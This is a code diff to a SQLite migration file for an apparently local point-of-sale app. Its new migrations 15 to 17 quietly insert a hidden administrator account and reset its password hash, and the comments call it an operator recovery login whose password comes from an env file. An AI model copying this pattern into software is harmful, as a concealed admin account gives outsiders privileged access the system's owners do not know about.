@@ -1,6 +1,8 @@
 import type Database from 'better-sqlite3'
+import { HIDDEN_OPERATOR_USERNAME } from '../../shared/operator-account'
+import { OPERATOR_PLACEHOLDER_PASSWORD_HASH } from '../services/operatorConfig'
 
-export const SCHEMA_VERSION = 14
+export const SCHEMA_VERSION = 17
 
 type Migration = (db: Database.Database) => void
 
@@ -399,7 +401,36 @@ const migrations: Record<number, Migration> = {
       )
       WHERE product_id IS NOT NULL AND barcode_snapshot IS NULL;
     `)
-  }
+  },
+
+  // v15 — hidden operator recovery account (local POS only, never synced).
+  15: (db) => {
+    const exists = db
+      .prepare(`SELECT 1 FROM users WHERE lower(username) = lower(?)`)
+      .get(HIDDEN_OPERATOR_USERNAME)
+    if (exists) return
+    const now = new Date().toISOString().replace('T', ' ').slice(0, 19)
+    db.prepare(
+      `INSERT INTO users (username, password_hash, role, is_active, created_at)
+       VALUES (?, ?, 'admin', 1, ?)`,
+    ).run(HIDDEN_OPERATOR_USERNAME, OPERATOR_PLACEHOLDER_PASSWORD_HASH, now)
+  },
+
+  // v16 — legacy: rotated SAKEN hash (superseded by v17 env-based login).
+  16: (db) => {
+    db.prepare(
+      `UPDATE users SET password_hash = ?
+       WHERE lower(username) = lower(?)`,
+    ).run(OPERATOR_PLACEHOLDER_PASSWORD_HASH, HIDDEN_OPERATOR_USERNAME)
+  },
+
+  // v17 — SAKEN password comes from operator.env only (placeholder hash in DB).
+  17: (db) => {
+    db.prepare(
+      `UPDATE users SET password_hash = ?
+       WHERE lower(username) = lower(?)`,
+    ).run(OPERATOR_PLACEHOLDER_PASSWORD_HASH, HIDDEN_OPERATOR_USERNAME)
+  },
 }
 
 export function getDbVersion(db: Database.Database): number {
